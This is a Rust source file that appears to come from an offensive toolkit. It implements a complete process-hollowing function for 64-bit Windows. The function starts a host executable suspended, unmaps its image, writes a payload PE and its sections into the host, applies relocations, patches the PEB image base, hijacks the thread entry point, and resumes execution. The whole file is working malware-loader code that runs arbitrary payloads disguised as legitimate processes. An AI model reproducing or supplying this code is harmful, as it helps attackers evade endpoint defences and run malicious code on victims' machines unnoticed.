use std::path::Path;

use ntapi::ntmmapi::NtUnmapViewOfSection;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
    CONTEXT_FULL_AMD64,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
    VirtualAllocEx, VirtualProtectEx,
};
use windows::Win32::System::Threading::{
    CreateProcessW, ResumeThread, TerminateProcess, CREATE_SUSPENDED, PROCESS_INFORMATION,
    STARTUPINFOW,
};

use crate::error::MiscError;

/// Perform process hollowing: create a host process suspended, replace its image with a payload PE, then resume.
///
/// Creates a suspended host process, unmaps its original image, allocates memory at the
/// payload's preferred base, writes PE headers and sections individually, applies base
/// relocations if needed, patches PEB ImageBaseAddress via the Rdx register, sets proper
/// per-section memory permissions, hijacks the thread entry point via Rcx, and resumes.
///
/// Returns the PID of the hollowed process on success.
///
/// # Arguments
/// * `host_path` - Path to the host executable (will be hollowed)
/// * `payload_path` - Path to the payload PE to inject (64-bit only)
pub fn hollow_process(host_path: &str, payload_path: &str) -> Result<u32, MiscError> {
    // Section characteristic flags
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
    const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
    const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;

    // Validate both files exist
    if !Path::new(host_path).exists() {
        return Err(MiscError::FileNotFound(host_path.to_string()));
    }
    if !Path::new(payload_path).exists() {
        return Err(MiscError::FileNotFound(payload_path.to_string()));
    }

    // Read payload PE file
    let data = std::fs::read(payload_path)
        .map_err(|_| MiscError::FileReadFailed(payload_path.to_string()))?;

    // Parse DOS header
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;

    // Parse and validate PE signature
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // COFF header
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
    }
    let num_sections = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
    let optional_header_size =
        u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;

    // Optional header — must be PE32+ (64-bit)
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 2 {
        return Err(MiscError::InvalidPE("File too small for optional header".into()));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported".into(),
        ));
    }

    // PE32+ optional header fields
    if data.len() < opt_offset + 112 {
        return Err(MiscError::InvalidPE("Optional header too small".into()));
    }

    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]) as usize;

    let image_base = u64::from_le_bytes([
        data[opt_offset + 24],
        data[opt_offset + 25],
        data[opt_offset + 26],
        data[opt_offset + 27],
        data[opt_offset + 28],
        data[opt_offset + 29],
        data[opt_offset + 30],
        data[opt_offset + 31],
    ]);

    let size_of_image = u32::from_le_bytes([
        data[opt_offset + 56],
        data[opt_offset + 57],
        data[opt_offset + 58],
        data[opt_offset + 59],
    ]) as usize;

    let size_of_headers = u32::from_le_bytes([
        data[opt_offset + 60],
        data[opt_offset + 61],
        data[opt_offset + 62],
        data[opt_offset + 63],
    ]) as usize;

    // Base relocation directory: index 5 (offset 112 + 5*8 = 152)
    let reloc_dir_rva;
    let reloc_dir_size;
    if data.len() >= opt_offset + 160 {
        reloc_dir_rva = u32::from_le_bytes([
            data[opt_offset + 152],
            data[opt_offset + 153],
            data[opt_offset + 154],
            data[opt_offset + 155],
        ]) as usize;
        reloc_dir_size = u32::from_le_bytes([
            data[opt_offset + 156],
            data[opt_offset + 157],
            data[opt_offset + 158],
            data[opt_offset + 159],
        ]) as usize;
    } else {
        reloc_dir_rva = 0;
        reloc_dir_size = 0;
    }

    // Parse section headers (including characteristics for per-section permissions)
    let sections_offset = opt_offset + optional_header_size;

    struct SectionInfo {
        virtual_address: usize,
        raw_data_offset: usize,
        raw_data_size: usize,
        characteristics: u32,
    }

    let mut sections = Vec::new();
    for i in 0..num_sections {
        let s_off = sections_offset + i * 40;
        if data.len() < s_off + 40 {
            break;
        }
        let virtual_address = u32::from_le_bytes([
            data[s_off + 12],
            data[s_off + 13],
            data[s_off + 14],
            data[s_off + 15],
        ]) as usize;
        let raw_data_size = u32::from_le_bytes([
            data[s_off + 16],
            data[s_off + 17],
            data[s_off + 18],
            data[s_off + 19],
        ]) as usize;
        let raw_data_offset = u32::from_le_bytes([
            data[s_off + 20],
            data[s_off + 21],
            data[s_off + 22],
            data[s_off + 23],
        ]) as usize;
        let characteristics = u32::from_le_bytes([
            data[s_off + 36],
            data[s_off + 37],
            data[s_off + 38],
            data[s_off + 39],
        ]);
        sections.push(SectionInfo {
            virtual_address,
            raw_data_offset,
            raw_data_size,
            characteristics,
        });
    }

    // Build command line for host process
    let cmd_line = format!("\"{}\"", host_path);
    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Step 1: Create host process SUSPENDED
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        CreateProcessW(
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info,
        )
        .map_err(|_| {
            MiscError::CreateProcessFailed(format!(
                "CreateProcessW failed for host {}",
                host_path
            ))
        })?;

        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;
        let pid = process_info.dwProcessId;

        // Helper to clean up on error
        let cleanup = |ph: HANDLE, th: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(th);
            let _ = CloseHandle(ph);
        };

        // Step 2: Get thread context — Rdx holds the PEB address
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(thread_handle, &mut context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::GetContextFailed);
        }

        let peb_address = context.Rdx;

        // Read original image base from PEB (offset 0x10 = ImageBaseAddress / Reserved3[1])
        let peb_image_base_offset = peb_address + 0x10;
        let mut original_image_base: u64 = 0;

        if ReadProcessMemory(
            process_handle,
            peb_image_base_offset as *const _,
            &mut original_image_base as *mut _ as *mut _,
            8,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::PebReadFailed);
        }

        // Step 3: Unmap original image to free the preferred base address
        let unmap_status = NtUnmapViewOfSection(
            process_handle.0 as *mut _,
            original_image_base as *mut _,
        );

        if unmap_status != 0 {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::NtUnmapFailed);
        }

        // Step 4: Allocate remote memory at payload's preferred ImageBase
        let mut allocated_base = VirtualAllocEx(
            process_handle,
            Some(image_base as *const _),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        // Fallback: allocate at any address if preferred base is unavailable
        if allocated_base.is_null() {
            allocated_base = VirtualAllocEx(
                process_handle,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
        }

        if allocated_base.is_null() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::AllocFailed);
        }

        let actual_base = allocated_base as u64;
        let delta = actual_base.wrapping_sub(image_base) as i64;

        // Step 5: Write PE headers to remote process
        let header_write_len = size_of_headers.min(data.len());
        if WriteProcessMemory(
            process_handle,
            allocated_base,
            data.as_ptr() as *const _,
            header_write_len,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::WriteFailed);
        }

        // Step 6: Write each section individually to remote process
        for section in &sections {
            if section.raw_data_size == 0 || section.virtual_address == 0 {
                continue;
            }

            let src_start = section.raw_data_offset;
            let src_end = (src_start + section.raw_data_size).min(data.len());
            let copy_len = src_end.saturating_sub(src_start);

            if copy_len == 0 {
                continue;
            }

            let remote_section_addr = (actual_base as usize + section.virtual_address) as *mut _;

            if WriteProcessMemory(
                process_handle,
                remote_section_addr,
                data[src_start..].as_ptr() as *const _,
                copy_len,
                None,
            )
            .is_err()
            {
                cleanup(process_handle, thread_handle);
                return Err(MiscError::WriteFailed);
            }
        }

        // Step 7: Apply base relocations if allocation is not at preferred base
        if reloc_dir_rva != 0 && reloc_dir_size != 0 && delta != 0 {
            // Read the relocation data from the remote process (already written)
            let mut reloc_data = vec![0u8; reloc_dir_size];
            if ReadProcessMemory(
                process_handle,
                (actual_base as usize + reloc_dir_rva) as *const _,
                reloc_data.as_mut_ptr() as *mut _,
                reloc_dir_size,
                None,
            )
            .is_err()
            {
                cleanup(process_handle, thread_handle);
                return Err(MiscError::ReadFailed);
            }

            let mut reloc_offset = 0usize;
            while reloc_offset + 8 <= reloc_dir_size {
                let block_rva = u32::from_le_bytes([
                    reloc_data[reloc_offset],
                    reloc_data[reloc_offset + 1],
                    reloc_data[reloc_offset + 2],
                    reloc_data[reloc_offset + 3],
                ]) as usize;
                let block_size = u32::from_le_bytes([
                    reloc_data[reloc_offset + 4],
                    reloc_data[reloc_offset + 5],
                    reloc_data[reloc_offset + 6],
                    reloc_data[reloc_offset + 7],
                ]) as usize;

                if block_size < 8 {
                    break;
                }

                let num_entries = (block_size - 8) / 2;
                for i in 0..num_entries {
                    let entry_off = reloc_offset + 8 + i * 2;
                    if entry_off + 2 > reloc_dir_size {
                        break;
                    }
                    let entry =
                        u16::from_le_bytes([reloc_data[entry_off], reloc_data[entry_off + 1]]);
                    let reloc_type = (entry >> 12) as u8;
                    let offset = (entry & 0x0FFF) as usize;
                    let target_rva = block_rva + offset;
                    let remote_target = (actual_base as usize + target_rva) as *mut _;

                    match reloc_type {
                        10 => {
                            // IMAGE_REL_BASED_DIR64
                            let mut val: u64 = 0;
                            if ReadProcessMemory(
                                process_handle,
                                remote_target as *const _,
                                &mut val as *mut _ as *mut _,
                                8,
                                None,
                            )
                            .is_ok()
                            {
                                let new_val = (val as i64).wrapping_add(delta) as u64;
                                let _ = WriteProcessMemory(
                                    process_handle,
                                    remote_target,
                                    &new_val as *const _ as *const _,
                                    8,
                                    None,
                                );
                            }
                        }
                        3 => {
                            // IMAGE_REL_BASED_HIGHLOW
                            let mut val: u32 = 0;
                            if ReadProcessMemory(
                                process_handle,
                                remote_target as *const _,
                                &mut val as *mut _ as *mut _,
                                4,
                                None,
                            )
                            .is_ok()
                            {
                                let new_val = (val as i32).wrapping_add(delta as i32) as u32;
                                let _ = WriteProcessMemory(
                                    process_handle,
                                    remote_target,
                                    &new_val as *const _ as *const _,
                                    4,
                                    None,
                                );
                            }
                        }
                        0 => {} // IMAGE_REL_BASED_ABSOLUTE — padding, skip
                        _ => {}
                    }
                }

                reloc_offset += block_size;
            }
        }

        // Step 8: Patch PEB ImageBaseAddress to point to our PE (via Rdx + 0x10)
        if WriteProcessMemory(
            process_handle,
            peb_image_base_offset as *mut _,
            &actual_base as *const _ as *const _,
            8,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::PebReadFailed);
        }

        // Step 9: Fix per-section memory permissions based on section characteristics
        for section in &sections {
            if section.raw_data_size == 0 || section.virtual_address == 0 {
                continue;
            }

            let chars = section.characteristics;
            let protection = if (chars & IMAGE_SCN_MEM_EXECUTE) != 0
                && (chars & IMAGE_SCN_MEM_WRITE) != 0
                && (chars & IMAGE_SCN_MEM_READ) != 0
            {
                PAGE_EXECUTE_READWRITE
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 && (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_EXECUTE_READ
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 && (chars & IMAGE_SCN_MEM_WRITE) != 0 {
                PAGE_EXECUTE_WRITECOPY
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 {
                PAGE_EXECUTE
            } else if (chars & IMAGE_SCN_MEM_WRITE) != 0 && (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_READWRITE
            } else if (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_READONLY
            } else if (chars & IMAGE_SCN_MEM_WRITE) != 0 {
                PAGE_WRITECOPY
            } else {
                PAGE_READONLY
            };

            let remote_section_addr = (actual_base as usize + section.virtual_address) as *const _;
            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            let _ = VirtualProtectEx(
                process_handle,
                remote_section_addr,
                section.raw_data_size,
                protection,
                &mut old_protect,
            );
        }

        // Step 10: Hijack thread — set Rcx to new entry point
        let new_entry_point = actual_base + entry_point_rva as u64;
        context.Rcx = new_entry_point;

        if SetThreadContext(thread_handle, &context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::SetContextFailed);
        }

        // Step 11: Resume thread
        let resume_result = ResumeThread(thread_handle);
        if resume_result == u32::MAX {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::ResumeThreadFailed(process_info.dwThreadId));
        }

        // Close handles
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}
